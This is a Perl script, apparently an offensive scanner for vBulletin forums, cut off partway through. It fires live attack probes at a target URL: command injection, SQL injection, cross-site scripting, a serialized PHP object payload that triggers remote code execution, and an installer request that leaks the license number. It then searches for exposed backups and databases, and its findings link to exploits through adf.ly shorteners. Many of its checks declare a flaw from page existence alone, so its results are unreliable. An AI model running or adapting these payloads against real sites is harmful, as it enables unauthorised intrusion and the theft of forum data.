use LWP::UserAgent;
use Term::ANSIColor;
use LWP::Simple;

my $url = $ARGV[1];
my $ou = new LWP::UserAgent;
my $bnum = "0";
my $cnum = "0";
my $nvnum = "0";
my $vnum = "0";


# Check Htaccess
my $htnum = "0";
my @htac = ('.htaccess' , '.htaccess.txt' , 'htaccess' , 'htaccess.txt');
foreach	my $ht (@htac){
	my $shtac = $ou->get("$url/$ht")->decoded_content;
	if (head("$url/$ht") and "$shtac" =~ "</"){
	print color("green") , "   [+] Htaccess File Found At : $url/$ht\n" . color("reset");
	$htnum = $htnum + 1;
	}
}
if ("$htnum" eq "0"){
	print color("on_red") , "   [-] Htaccess File Not Avalible Or Not Readable !!\n" , color("reset");
}
	
	my $srobots = $ou->get("$url/robots.txt")->decoded_content;
	if (head("$url/robots.txt") and "$srobots" =~ "User-agent:" or "$srobots" =~ "User-agent:" or "$srobots" =~ "Disallow:"){
	print color("green") , "   [+] Robots File Found At : $url/robots.txt\n" . color("reset");
	$htnum = $htnum + 1;
	}
	elsif (head("$url/admin")){
	print color("green") , "   [+] Admin Panel Found At : $url/admin/\n" . color("reset");
	print color("yellow") , "    -  The Attacker Can make Bruteforce Attack Easly\n" . color("reset");	
	$htnum = $htnum + 1;
	}
	elsif (head("$url/admincp")){
	print color("green") , "   [+] Admin Panel Found At : $url/admincp/\n" . color("reset");
	print color("yellow") , "    -  The Attacker Can make Bruteforce Attack Easly\n" . color("reset");	
	$htnum = $htnum + 1;
	}else{
	print color("on_red") , "   [-] Admin Panel Not Found !!\n" . color("reset");
	}




my $seovbsource = $ou->get("$url/vbseo.php?vbseoembedd=1&vbseourl=./clientscript/vbulletin_global.js")->decoded_content;
$nvnum = $nvnum + 1;
if ("$seovbsource" =~ m/do_securitytoken_replacement/i){
	$vnum = $vnum + 1;
	print color("yellow") . "\a\n  [+] Local File Include Explit In 'vbseo.php'\n" . color("reset");
	print color("yellow") . "  [+] Exploit : /vbseo.php?vbseoembedd=1&vbseourl=./clientscript/vbulletin_global.js\n" . color("reset");
}else{
	print color("on_red") . "\n  [-] Not Found : Local File Include In 'vbseo.php'\n" . color("reset");
}


my $vbversource = $ou->get("$url")->decoded_content;
$nvnum = $nvnum + 1;
if ("$vbversource" =~ m/vBulletin® Version 3.8.4/i){
	$vnum = $vnum + 1;
	print color("yellow") . "\a\n  [+] Registration Bypass Vulnerability In 'vBulletin® Version 3.8.4' \n" . color("reset");
	print color("yellow") . "  [+] Exploit : http://adf.ly/1Zgp1q\n" . color("reset");
}else{
	print color("on_red") . "\n  [-] Not Found : Registration Bypass Vulnerability In 'vBulletin® Version 3.8.4'\n" . color("reset");
}

my $v1bversource = $ou->get("$url")->decoded_content;
$nvnum = $nvnum + 1;
if ("$v1bversource" =~ m/vBulletin® Version 3.8.5/i){
	$vnum = $vnum + 1;
	print color("yellow") . "\a\n  [+] Registration Bypass Vulnerability In 'vBulletin® Version 3.8.5'\n" . color("reset");
	print color("yellow") . "  [+] Exploit : http://adf.ly/1Zgp1q\n" . color("reset");
}else{
	print color("on_red") . "\n  [-] Not Found : Registration Bypass Vulnerability In 'vBulletin® Version 3.8.5'\n" . color("reset");
}


my $rcefaqsource = $ou->get("$url/faq.php?cmd=echo \"<l1574574l>\"")->decoded_content;
$nvnum = $nvnum + 1;
if ("$rcefaqsource" =~ m/<l1574574l>/i){
	$vnum = $vnum + 1;
	print color("yellow") . "\a\n  [+] Remote Code Excution Vulnerability In 'faq.php'\n" . color("reset");
	print color("yellow") . "  [+] Exploit : /faq.php?cmd=dir\n" . color("reset");
}else{
	print color("on_red") . "\n  [-] Not Found : Remote Code Excution Vulnerability In 'faq.php'\n" . color("reset");
}


my $sqlsource = $ou->get("$url" . '/arcade.php?act=Arcade&do=stats&comment=a&s_id=1%27')->decoded_content;
$nvnum = $nvnum + 1;
if (head($url . '/arcade.php?act=Arcade&do=stats&comment=a&s_id=1%27') && "$sqlsource" =~ m/mySQL error/i){
	$vnum = $vnum + 1;
	print color("yellow") . "\a\n  [+] SQL-Injection Vulnerability In 'arcade.php'\n" . color("reset");
	print color("yellow") . "  [+] Exploit : /arcade.php?act=Arcade&do=stats&comment=a&s_id=1{Inject_Here}\n" . color("reset");
}else{
	print color("on_red") . "\n  [-] Not Found : SQL-Injection in 'arcade.php'\n" . color("reset");
}



my $rcevbtwo = $ou->get("$url" . '/ajax/api/hook/decodeArguments?arguments=O%3A12%3A"vB_dB_Result"%3A2%3A%7Bs%3A5%3A"%00%2A%00db"%3BO%3A11%3A"vB_Database"%3A1%3A%7Bs%3A9%3A"functions"%3Ba%3A1%3A%7Bs%3A11%3A"free_result"%3Bs%3A7%3A"phpinfo"%3B%7D%7Ds%3A12%3A"%00%2A%00recordset"%3Bi%3A1%3B%7D')->decoded_content;
$nvnum = $nvnum + 1;
if ("$rcevbtwo" =~ m/phpinfo\(\)/i or "$rcevbtwo" =~ m/phpinfo()/i){
	$vnum = $vnum + 1;
	print color("yellow") . "\a\n  [+] Remote Code Excution Vulnerability In 'ajax'\n" . color("reset");
	print color("yellow") . "  [+] Exploit : http://adf.ly/1Zgq3j\n" . color("reset");
}else{
	print color("on_red") . "\n  [-] Not Found : Ajax Remote Code Excution Vulnerability In 'ajax'\n" . color("reset");
}


my $chkvbvb = $ou->post("$url/install/upgrade.php", ["searchHash" => "Search"]);
$nvnum = $nvnum + 1;
if ($chkvbvb->content =~ /CUSTNUMBER = \"(.+)\";/){
	$vnum = $vnum + 1;
	print color("yellow") . "\a\n  [+] Remote Admin Injection Exploit In 'upgrade.php'\n" . color("reset");
	print color("yellow") . "  [+] Exploit : http://adf.ly/1ZgqmC\n" . color("reset");
}else{
	print color("on_red") . "\n  [-] Not Found : Remote Admin Injection Vulnerability In 'upgrade.php'\n" . color("reset");
}


my $vbdd = $ou->get("$url")->decoded_content;
$nvnum = $nvnum + 1;
if ("$vbdd" =~ m/vBulletin® Version 3.8.6/i){
	$vnum = $vnum + 1;
	print color("yellow") . "\a\n  [+] Information Disclosure Vulnerability In 'vBulletin® Version 3.8.6'\n" . color("reset");
	print color("yellow") . "  [+] Exploit : http://adf.ly/1ZgrPV\n" . color("reset");
}else{
	print color("on_red") . "\n  [-] Not Found : Information Disclosure Vulnerability In 'vBulletin® Version 3.8.6'\n" . color("reset");
}

$nvnum = $nvnum + 1;
if ("$vbdd" =~ m/vBulletin version 5.1/i){
	$vnum = $vnum + 1;
	print color("yellow") . "\a\n  [+] Remote Code Execution Exploit In 'vBulletin version 5.1'\n" . color("reset");
	print color("yellow") . "  [+] Exploit : http://adf.ly/1ZguwU\n" . color("reset");
}else{
	print color("on_red") . "\n  [-] Not Found : Remote Code Execution Exploit In 'vBulletin version 5.1'\n" . color("reset");
}

$nvnum = $nvnum + 1;
if ("$vbdd" =~ m/vBulletin Version 5.1.2/i){
	$vnum = $vnum + 1;
	print color("yellow") . "\a\n  [+] SQL Injection Exploit 0day In 'vBulletin version 5.1.2'\n" . color("reset");
	print color("yellow") . "  [+] Exploit : http://adf.ly/1ZgvCI\n" . color("reset");
}else{
	print color("on_red") . "\n  [-] Not Found : SQL Injection Exploit 0day In 'vBulletin version 5.1.2'\n" . color("reset");
}

$nvnum = $nvnum + 1;
if ("$vbdd" =~ m/vBulletin Version 3.8.4/i){
	$vnum = $vnum + 1;
	print color("yellow") . "\a\n  [+] Cross-Site Scripting In 'vBulletin Version 3.8.4'\n" . color("reset");
	print color("yellow") . "  [+] Exploit : http://adf.ly/1Zgw33\n" . color("reset");
}else{
	print color("on_red") . "\n  [-] Not Found : Cross-Site Scripting In 'vBulletin Version 3.8.4'\n" . color("reset");
}

$nvnum = $nvnum + 1;
if ("$vbdd" =~ m/vBulletin® Version 3.8.4/i){
	$vnum = $vnum + 1;
	print color("yellow") . "\a\n  [+] Cross-Site Scripting In 'vBulletin® Version 3.8.4'\n" . color("reset");
	print color("yellow") . "  [+] Exploit : http://adf.ly/1Zgw33\n" . color("reset");
}else{
	print color("on_red") . "\n  [-] Not Found : Cross-Site Scripting In 'vBulletin® Version 3.8.4'\n" . color("reset");
}

$nvnum = $nvnum + 1;
if ("$vbdd" =~ m/vBulletin Version 3.8.4/i){
	$vnum = $vnum + 1;
	print color("yellow") . "\a\n  [+] Cross-Site Scripting In 'vBulletin Version 3.8.4'\n" . color("reset");
	print color("yellow") . "  [+] Exploit : http://adf.ly/1Zgw33\n" . color("reset");
}else{
	print color("on_red") . "\n  [-] Not Found : Cross-Site Scripting In 'vBulletin Version 3.8.4'\n" . color("reset");
}


$nvnum = $nvnum + 1;
if (head("$url" . "/search.php?search_type=1")){
	$vnum = $vnum + 1;
	print color("yellow") . "\a\n  [+] SQL Injection Exploit In 'search.php'\n" . color("reset");
	print color("yellow") . "  [+] Exploit : http://adf.ly/1ZgwK8   /   http://adf.ly/1Zk7AD\n" . color("reset");
}else{
	print color("on_red") . "\n  [-] Not Found : SQL-Injection In 'search.php'\n" . color("reset");
}

$nvnum = $nvnum + 1;
if (head("$url" . "/search.php") or "$vbdd" =~ m/vBulletin Version 4.0./i){
	$vnum = $vnum + 1;
	print color("yellow") . "\a\n  [+] SQL Injection Exploit In 'search.php v4.0.x'\n" . color("reset");
	print color("yellow") . "  [+] Exploit : http://adf.ly/1Zna6u\n" . color("reset");
}else{
	print color("on_red") . "\n  [-] Not Found : SQL-Injection In 'search.php v4.0.x'\n" . color("reset");
}


$nvnum = $nvnum + 1;
if ("$vbdd" =~ m/vBulletin Version 4.1.0/i or "$vbdd" =~ m/vBulletin Version 4.1.0/i or "$vbdd" =~ m/vBulletin Version 4.0.1/i or "$vbdd" =~ m/vBulletin Version 4.0.2/i or "$vbdd" =~ m/vBulletin Version 4.0.3/i or "$vbdd" =~ m/vBulletin Version 4.0.4/i or "$vbdd" =~ m/vBulletin Version 4.0.5/i or "$vbdd" =~ m/vBulletin Version 4.0.6/i or "$vbdd" =~ m/vBulletin Version 4.0.7/i or "$vbdd" =~ m/vBulletin Version 4.0.8/i or "$vbdd" =~ m/vBulletin Version 4.0.9/i or "$vbdd" =~ m/vBulletin Version 4.0.10/i or "$vbdd" =~ m/vBulletin Version 4.0.11/i or "$vbdd" =~ m/vBulletin Version 4.0.12/i or "$vbdd" =~ m/vBulletin Version 4.1.0/i or "$vbdd" =~ m/vBulletin Version 4.1.1/i or "$vbdd" =~ m/vBulletin Version 4.1.2/i or "$vbdd" =~ m/vBulletin Version 4.1.3/i){
	$vnum = $vnum + 1;
	print color("yellow") . "\a\n  [+] SQL Injection Vulnerability In 'vBulletin Version 4.x.x'\n" . color("reset");
	print color("yellow") . "  [+] Exploit : http://adf.ly/1ZgyH4\n" . color("reset");
}else{
	print color("on_red") . "\n  [-] Not Found : SQL-Injection In 'vBulletin Version 4.x.x'\n" . color("reset");
}



$nvnum = $nvnum + 1;
my $xssvb = $ou->get("$url/xperience.php?sortfield=xr&sortorder=\"><script>alert(127543);</script>")->decoded_content;
if ("$xssvb" =~ m/\<script\>alert\(127543\);\<\/script\>/i){
	$vnum = $vnum + 1;
	print color("yellow") . "\a\n  [+] Cross Site Scripting Vulnerability In 'xperience.php'\n" . color("reset");
	print color("yellow") . "  [+] Exploit : http://adf.ly/1Zgrjf\n" . color("reset");
}else{
	print color("on_red") . "\n  [-] Not Found : Xss In 'xperience.php'\n" . color("reset");
}


$nvnum = $nvnum + 1;
if (head("$url/clientscript/yui/uploader/assets/uploader.swf")){
	$vnum = $vnum + 1;
	my $ffffvbsource = $ou->get("$url/clientscript/yui/uploader/uploader-min.js")->decoded_content;
	if ("$ffffvbsource" =~ m/version: 2/i){
	print color("yellow") . "\a\n  [+] vBulletin YUI 2.9.0 Cross Site Scripting In 'uploader.swf'\n" . color("reset");
	print color("yellow") . "  [+] Exploit : http://adf.ly/1Zgs4C\n" . color("reset");
	}else{
	print color("on_red") . "\n  [-] Not Found : Xss In 'uploader.swf'\n" . color("reset");
}
}else{
	print color("on_red") . "\n  [-] Not Found : Xss In 'uploader.swf\n" . color("reset");
}



$nvnum = $nvnum + 1;
my $vbc99xml = $ou->get("$url/admincp/subscriptions.php?do=api")->decoded_content;
if ("$vbc99xml" =~ m/c99shell/i || "$vbc99xml" =~ m/shell/i){
	$vnum = $vnum + 1;
	print color("yellow") . "\a\n  [+] C99 Shell Found\n" . color("reset");
	print color("yellow") . "  [+] Exploit : /admincp/subscriptions.php?do=api\n" . color("reset");
}else{
	print color("on_red") . "\n  [-] Not Found C99 Shell !!\n" . color("reset");
}


$nvnum = $nvnum + 1;
my $cpfinder = $ou->get("$url/admincp/index.php")->decoded_content;
if ("$cpfinder" =~ m/Admin Control Panel/i || "$cpfinder" =~ m/form action="..\/login.php?do=login"/i || "$cpfinder" =~ m/ADMINHASH/i){
	$vnum = $vnum + 1;
    	print color("yellow") . "\a\n  [+] Admin Panel Found : $url/admincp\n" . color("reset");
}else{
	print color("on_red") . "\n  [-] Not Found Admin Panel !!\n" . color("reset");
}

$nvnum = $nvnum + 1;
my $modcpfinder = $ou->get("$url/admincp/index.php")->decoded_content;
if ("$modcpfinder" =~ m/Moderator Control Panel/i || "$modcpfinder" =~ m/form action="..\/login.php?do=login"/i || "$modcpfinder" =~ m/ADMINHASH/i){
	$vnum = $vnum + 1;
    	print color("yellow") . "\a\n  [+] Modcp Admin Panel Found : $url/modcp\n" . color("reset");
}else{
	print color("on_red") . "\n  [-] Not Found Moderator Control Panel !!\n" . color("reset");
}


$nvnum = $nvnum + 1;
if (head("$url/vbseocp.php")){
	$vnum = $vnum + 1;
	print color("yellow") . "\a\n  [+] Remote PHP Code Injection Exploit In 'vbseocp.php'\n" . color("reset");
	print color("yellow") . "  [+] Exploit : http://adf.ly/1Zgu7o\n" . color("reset");
}else{
	print color("on_red") . "\n  [-] Not Found Remote PHP Code Injection Exploit In 'vbseocp.php'\n" . color("reset");
}


$nvnum = $nvnum + 1;
if (head("$url/visitormessage.php")){
	$vnum = $vnum + 1;
	print color("yellow") . "\a\n  [+] Remote Code Injection Vulnerability In 'visitormessage.php'\n" . color("reset");
	print color("yellow") . "  [+] Exploit : http://adf.ly/1ZguMb\n" . color("reset");
}else{
	print color("on_red") . "\n  [-] Not Found Remote Code Injection Vulnerability In 'visitormessage.php'\n" . color("reset");
}


$nvnum = $nvnum + 1;
if ("$vbdd" =~ m/vBulletin™ Version 5.0.0 Beta/i){
	$vnum = $vnum + 1;
	print color("yellow") . "\a\n  [+] SQL-Injection Vulnerability In 'vBulletin™ Version 5.0.0 Beta'\n" . color("reset");
	print color("yellow") . "  [+] Exploit : http://adf.ly/1ZiARm  /  http://adf.ly/1ZiAZt\n" . color("reset");
}else{
	print color("on_red") . "\n  [-] Not Found : SQL-Injection Vulnerability In 'vBulletin™ Version 5.0.0 Beta'\n" . color("reset");
}


$nvnum = $nvnum + 1;
if (head("$url" . '/ajax.php?do=inforum&result=10&listforumid=1')){
	$vnum = $vnum + 1;
	print color("yellow") . "\a\n  [+] SQL-Injection Vulnerability In 'ajax.php'\n" . color("reset");
	print color("yellow") . "  [+] Exploit : http://adf.ly/1ZiB4M\n" . color("reset");
}else{
	print color("on_red") . "\n  [-] Not Found : SQL-Injection Vulnerability In 'ajax.php'\n" . color("reset");
}


$nvnum = $nvnum + 1;
if (head("$url" . '/install/install.php')){
	if ("$vbdd" =~ m/vBulletin™ Version 4/i or "$vbdd" =~ m/vBulletin™ Version 5/i){
	$vnum = $vnum + 1;
	print color("yellow") . "\a\n  [+] SQL-Injection Vulnerability In 'vBulletin™ Version 4.1.2'\n" . color("reset");
	print color("yellow") . "  [+] Exploit : http://adf.ly/1ZiBTT\n" . color("reset");
	}else{
	print color("on_red") . "\n  [-] Not Found : SQL-Injection Vulnerability In 'vBulletin™ Version 5.0.0 Beta'\n" . color("reset");
	}
}


$nvnum = $nvnum + 1;
if ("$vbdd" =~ m/vBulletin™ Version 3.8/i){
	$vnum = $vnum + 1;
	print color("yellow") . "\a\n  [+] MySql Inject To Shell  In 'vBulletin™ Version 3.8.x'\n" . color("reset");
	print color("yellow") . "  [+] Exploit : http://adf.ly/1ZiBhV\n" . color("reset");
}else{
	print color("on_red") . "\n  [-] Not Found : MySql Inject To Shell  In 'vBulletin™ Version 3.8.x'\n" . color("reset");
}


$nvnum = $nvnum + 1;
if (head("$url" . '/infernoshout.php')){
	$vnum = $vnum + 1;
	print color("yellow") . "\a\n  [+] SQL-Injection Vulnerability In 'infernoshout.php'\n" . color("reset");
	print color("yellow") . "  [+] Exploit : http://adf.ly/1ZiCFj\n" . color("reset");
}else{
	print color("on_red") . "\n  [-] Not Found : SQL-Injection Vulnerability In 'infernoshout.php'\n" . color("reset");
}


$nvnum = $nvnum + 1;
if ("$vbdd" =~ m/vBulletin™ Version 3/i or "$vbdd" =~ m/vBulletin™ Version 4.2.0/i or "$vbdd" =~ m/vBulletin™ Version 4.1.0/i or "$vbdd" =~ m/vBulletin™ Version 4/i){
	$vnum = $vnum + 1;
	print color("yellow") . "\a\n  [+] MySql Inject To Shell  In 'vBulletin™ Version 3.8.x'\n" . color("reset");
	print color("yellow") . "  [+] Exploit : http://adf.ly/1ZiBhV\n" . color("reset");
}else{
	print color("on_red") . "\n  [-] Not Found : MySql Inject To Shell  In 'vBulletin™ Version 3.8.x'\n" . color("reset");
}


$nvnum = $nvnum + 1;
if ("$vbdd" =~ m/vBulletin™ Version 4/i){
	$vnum = $vnum + 1;
	print color("yellow") . "\a\n  [+] Flood User Exploit In '4.x.x'\n" . color("reset");
	print color("yellow") . "  [+] Exploit : http://adf.ly/1ZiDEZ   /   http://adf.ly/1ZiDHJ\n" . color("reset");
}else{
	print color("on_red") . "\n  [-] Not Found : Flood User Exploit In '4.x.x'\n" . color("reset");
}


$nvnum = $nvnum + 1;
if ("$vbdd" =~ m/vBulletin™ Version 4/i or "$vbdd" =~ m/vBulletin™ Version 3/i){
	$vnum = $vnum + 1;
	print color("yellow") . "\a\n  [+] vBulletin Login Backdoor In 'vBulletin™ Version 3.x.x or 4.x.x'\n" . color("reset");
	print color("yellow") . "  [+] Exploit : http://adf.ly/1ZiDjt\n" . color("reset");
}else{
	print color("on_red") . "\n  [-] Not Found : vBulletin Login Backdoor In 'vBulletin™ Version 3.x.x or 4.x.x'\n" . color("reset");
}



$nvnum = $nvnum + 1;
if (head("$url" . '/misc.php')){
	$vnum = $vnum + 1;
	print color("yellow") . "\a\n  [+] SQL-Injection Vulnerability In 'misc.php'\n" . color("reset");
	print color("yellow") . "  [+] Exploit : $url/misc.php?do=music_full­&id=[Sqli_here]\n" . color("reset");
}else{
	print color("on_red") . "\n  [-] Not Found : SQL-Injection Vulnerability In 'misc.php'\n" . color("reset");
}


$nvnum = $nvnum + 1;
if (head("$url" . '/install/upgrade.php')){
	$vnum = $vnum + 1;
if ("$vbdd" =~ m/vBulletin™ Version 4/i or "$vbdd" =~ m/vBulletin™ Version 5/i){
	print color("yellow") . "\a\n  [+] SQL-Injection In 'upgrade.php'\n" . color("reset");
	print color("yellow") . "  [+] Exploit : http://adf.ly/1ZiEXA\n" . color("reset");
}else{
	print color("on_red") . "\n  [-] Not Found : SQL-Injection In 'upgrade.php'\n" . color("reset");
}
}

$nvnum = $nvnum + 1;
if ("$vbdd" =~ m/vBulletin™ Version 3.5/i and head("$url" . '/member.php')){
	$vnum = $vnum + 1;
	print color("yellow") . "\a\n  [+] Cross-Site Scripting In 'member.php'\n" . color("reset");
	print color("yellow") . "  [+] Exploit : hhttp://adf.ly/1ZjDVb\n" . color("reset");
}else{
	print color("on_red") . "\n  [-] Not Found : Cross-Site Scripting In 'member.php'\n" . color("reset");
}


$nvnum = $nvnum + 1;
if ("$vbdd" =~ m/vBulletin™ Version 3.7.0/i and head("$url" . '/faq.php')){
	$vnum = $vnum + 1;
	print color("yellow") . "\a\n  [+] SQL-Injection In 'faq.php'\n" . color("reset");
	print color("yellow") . "  [+] Exploit : http://adf.ly/1ZjDqg\n" . color("reset");
}else{
	print color("on_red") . "\n  [-] Not Found : SQL-Injection In 'faq.php'\n" . color("reset");
}


$nvnum = $nvnum + 1;
if (head("$url" . '/vBTube.php')){
	$vnum = $vnum + 1;
	print color("yellow") . "\a\n  [+] Cross-Site Scripting In 'vBTube.php'\n" . color("reset");
	print color("yellow") . "  [+] Exploit : http://adf.ly/1ZjE9W\n" . color("reset");
}else{
	print color("on_red") . "\n  [-] Not Found : Cross-Site Scripting In 'vBTube.php'\n" . color("reset");
}


$nvnum = $nvnum + 1;
if ("$vbdd" =~ m/vBulletin™ Version 3/i){
	$vnum = $vnum + 1;
	print color("yellow") . "\a\n  [+] Cross-Site Scripting In 'vBulletin™ Version 3.x.x'\n" . color("reset");
	print color("yellow") . "  [+] Exploit : http://adf.ly/1ZjEFZ\n" . color("reset");
}else{
	print color("on_red") . "\n  [-] Not Found : Cross-Site Scripting In 'vBulletin™ Version 3.x.x'\n" . color("reset");
}


$nvnum = $nvnum + 1;
if ("$vbdd" =~ m/vBulletin™ Version 3.8.6/i){
	$vnum = $vnum + 1;
	print color("yellow") . "\a\n  [+] Information Disclosur In 'vBulletin™ Version 3.8.6'\n" . color("reset");
	print color("yellow") . "  [+] Exploit : http://adf.ly/1ZjEfg\n" . color("reset");
}else{
	print color("on_red") . "\n  [-] Not Found : Information Disclosur In 'vBulletin™ Version 3.8.6'\n" . color("reset");
}



$nvnum = $nvnum + 1;
if ("$vbdd" =~ m/vBulletin™ Version 3.8.4/i){
	$vnum = $vnum + 1;
	print color("yellow") . "\a\n  [+] File Include Vulnerability In 'vBulletin™ Version 3.8.4'\n" . color("reset");
	print color("yellow") . "  [+] Exploit : http://adf.ly/1ZjEpR\n" . color("reset");
}else{
	print color("on_red") . "\n  [-] Not Found : File Include Vulnerability In 'vBulletin™ Version 3.8.4'\n" . color("reset");
}



$nvnum = $nvnum + 1;
if (head("$url" . '/radioandtv.php')){
	$vnum = $vnum + 1;
	print color("yellow") . "\a\n  [+] XSS/Redirect/Iframe-Injection In 'Radio and TV Player Add-On'\n" . color("reset");
	print color("yellow") . "  [+] Exploit : http://adf.ly/1ZjF0G\n" . color("reset");
}else{
	print color("on_red") . "\n  [-] Not Found : XSS/Redirect/Iframe-Injection In 'Radio and TV Player Add-On'\n" . color("reset");
}


$nvnum = $nvnum + 1;
if ("$vbdd" =~ m/vBulletin™ Version 5.0.0 Beta/i){
	$vnum = $vnum + 1;
	print color("yellow") . "\a\n  [+] SQL-Injection In 'vBulletin™ Version 5.0.0 Beta'\n" . color("reset");
	print color("yellow") . "  [+] Exploit : http://adf.ly/1ZjFoC\n" . color("reset");
}else{
	print color("on_red") . "\n  [-] Not Found : SQL-Injection In 'vBulletin™ Version 5.0.0 Beta'\n" . color("reset");
}


$nvnum = $nvnum + 1;
if ("$vbdd" =~ m/vBulletin™ Version 5./i or "$vbdd" =~ m/vBulletin™ Version 4.1./i){
	$vnum = $vnum + 1;
	print color("yellow") . "\a\n  [+] Remote admin injection In 'vBulletin™ Version 4.1.x / 5.x.x'\n" . color("reset");
	print color("yellow") . "  [+] Exploit : http://adf.ly/1ZjFwj\n" . color("reset");
}else{
	print color("on_red") . "\n  [-] Not Found : Remote admin injection In 'vBulletin™ Version 4.1.x / 5.x.x'\n" . color("reset");
}


$nvnum = $nvnum + 1;
if (head("$url" . '/usertag.php')){
	$vnum = $vnum + 1;
	print color("yellow") . "\a\n  [+] Stored XSS Vulnerability In 'usertag.php'\n" . color("reset");
	print color("yellow") . "  [+] Exploit : http://adf.ly/1ZjG9z\n" . color("reset");
}else{
	print color("on_red") . "\n  [-] Not Found : Stored XSS Vulnerability In 'usertag.php'\n" . color("reset");
}


$nvnum = $nvnum + 1;
if (head("$url" . '/vbshout.php')){
	$vnum = $vnum + 1;
	print color("yellow") . "\a\n  [+] Stored XSS Vulnerability In 'vbshout.php'\n" . color("reset");
	print color("yellow") . "  [+] Exploit : http://adf.ly/1ZjGF9\n" . color("reset");
}else{
	print color("on_red") . "\n  [-] Not Found : Stored XSS Vulnerability In 'vbshout.php'\n" . color("reset");
}



$nvnum = $nvnum + 1;
if ("$vbdd" =~ m/vBulletin™ Version 4.1.12/i and head("$url" . '/includes/blog_plugin_useradmin.php')){
	$vnum = $vnum + 1;
	print color("yellow") . "\a\n  [+] Remote admin injection In 'blog_plugin_useradmin.php'\n" . color("reset");
	print color("yellow") . "  [+] Exploit : http://adf.ly/1ZjK0O\n" . color("reset");
}else{
	print color("on_red") . "\n  [-] Not Found : Remote admin injection In 'blog_plugin_useradmin.php'\n" . color("reset");
}


$nvnum = $nvnum + 1;
if ("$vbdd" =~ m/vBulletin™ Version 3.8.4/i or "$vbdd" =~ m/vBulletin™ Version 3.8.5/i){
	$vnum = $vnum + 1;
	print color("yellow") . "\a\n  [+] Registration Bypass Vulnerability In 'register.php'\n" . color("reset");
	print color("yellow") . "  [+] Exploit : http://adf.ly/1ZjKM1\n" . color("reset");
}else{
	print color("on_red") . "\n  [-] Not Found : Registration Bypass Vulnerability In 'register.php'\n" . color("reset");
}


if ("$vbdd" =~ m/vBulletin™ Version 5.1./i){
	$vnum = $vnum + 1;
	print color("yellow") . "\a\n  [+] RCE Exploit In 'v5.1.x'\n" . color("reset");
	print color("yellow") . "  [+] Exploit : http://adf.ly/1ZjKXh\n" . color("reset");
}else{
	print color("on_red") . "\n  [-] Not Found : RCE Exploit In 'v5.1.x'\n" . color("reset");
}



$nvnum = $nvnum + 1;
if ("$vbdd" =~ m/vBulletin™ Version 4.2.1/i){
	$vnum = $vnum + 1;
	print color("yellow") . "\a\n  [+] RCE Exploit In 'v5.1.x'\n" . color("reset");
	print color("yellow") . "  [+] Exploit : http://adf.ly/1ZjKjW\n" . color("reset");
}else{
	print color("on_red") . "\n  [-] Not Found : RCE Exploit In 'v5.1.x'\n" . color("reset");
}



$nvnum = $nvnum + 1;
if ("$vbdd" =~ m/vBulletin™ Version 4.2.2/i){
	$vnum = $vnum + 1;
	print color("yellow") . "\a\n  [+] CSRF Exploit In 'v4.2.2'\n" . color("reset");
	print color("yellow") . "  [+] Exploit : http://adf.ly/1ZjKss\n" . color("reset");
}else{
	print color("on_red") . "\n  [-] Not Found : CSRF Exploit In 'v4.2.2'\n" . color("reset");
}



$nvnum = $nvnum + 1;
if ("$vbdd" =~ m/vBulletin™ Version 4./i){
	$vnum = $vnum + 1;
	print color("yellow") . "\a\n  [+] SQL-Injection Exploit In 'v4.x'\n" . color("reset");
	print color("yellow") . "  [+] Exploit : http://adf.ly/1ZjKvi\n" . color("reset");
}else{
	print color("on_red") . "\n  [-] Not Found : SQL-Injection Exploit In 'v4.x'\n" . color("reset");
}


$nvnum = $nvnum + 1;
if (head("$url" . '/register.php')){
	$vnum = $vnum + 1;
	print color("yellow") . "\a\n  [+] SQL-Injection Exploit In 'register.php'\n" . color("reset");
	print color("yellow") . "  [+] Exploit : http://adf.ly/1ZjL7h\n" . color("reset");
}else{
	print color("on_red") . "\n  [-] Not Found : SQL-Injection Exploit In 'register.php'\n" . color("reset");
}
	$nvnum = $nvnum + 1;
	$vnum = $vnum + 1;
	print color("yellow") . "\a\n  [+] Test An Exploit In 'upgrade.php'\n" . color("reset");
	print color("yellow") . "  [+] Exploit : http://adf.ly/1ZjJj3\n" . color("reset");







# Backup Finder Request ^_^
my $bbnum = "0";
my $backreqq = "No";
while ("$backreqq" eq "No"){
print color("cyan") . "\n  [~] Do You Want To Start Backup-Finder ? [Y/n] : " . color("reset");
my $backreq = <STDIN>;
chomp($backreq);
if ("$backreq" eq "y" or "$backreq" eq "Y" or "$backreq" eq "Yes" or "$backreq" eq "yes" or "$backreq" eq "YES" or "$backreq" eq ""){
	$backreqq = "Yes";
@conbfigs = ('db.txt' , '/backup.tar.gz', '/backup/backup.tar.gz', '/backup/backup.zip', '/vb/backup.zip', '/site/backup.zip', '/backup.zip', '/backup.rar', '/backup.sql', '/vb/vb.zip', '/vb.zip', '/vb.sql', '/vb.rar', '/vb1.zip', '/vb2.zip', '/vbb.zip', '/vb3.zip', '/upload.zip', '/up/upload.zip', '/joomla.zip', '/joomla.rar', '/joomla.sql', '/wordpress.zip', '/wp/wordpress.zip', '/blog/wordpress.zip', '/wordpress.rar' , 'backup.zip','upload.zip','vb.zip','forum.zip','forum.tar','forum.tar.gz','backup.tar.gz','2.zip','1.zip','database.zip','sql.zip','backup.sql','database.sql','db.sql','site.sql','DB.sql','Database.sql','db.zip','1.sql','Database.zip');
foreach my $backjup (@conbfigs){

if ($ou->get("$url$backjup")->decoded_content =~ "file does not exist"){
	my $skjdfhsdjkf = "sdajkfh";
}else{
    if (head("$url/$backjup")) {
    print color("yellow") . "\a    - File Found : $url/$backjup\n" . color("reset");
    $bbnum = $bbnum + 1;
    }
}
}
if ("$bbnum" eq "0"){
	print color("on_red") . "      [-] Not Found Any Backup File !!\n" . color("reset");
}
}elsif ("$backreq" eq "n" or "$backreq" eq "N" or "$backreq" eq "no" or "$backreq" eq "No" or "$backreq" eq "NO" or "$backreq" eq "nO"){
		$backreqq = "Yes";
	print "\n";
	}else{
		print color("on_red") . "      [-] Command '$backreq' Not Found !!\n" . color("reset");
		$backreqq = "No";
	}
}


# Config Finder Request ^_^
my $ccnum = "0";
my $conreqq = "No";
while ("$conreqq" eq "No"){
print color("cyan") . "\n  [~] Do You Want To Start Config-Finder ? [Y/n] : " . color("reset");
my $conreq = <STDIN>;
chomp($conreq);
if ("$conreq" eq "y" or "$conreq" eq "Y" or "$conreq" eq "Yes" or "$conreq" eq "yes" or "$conreq" eq "YES" or "$conreq" eq ""){
	$conreqq = "Yes";
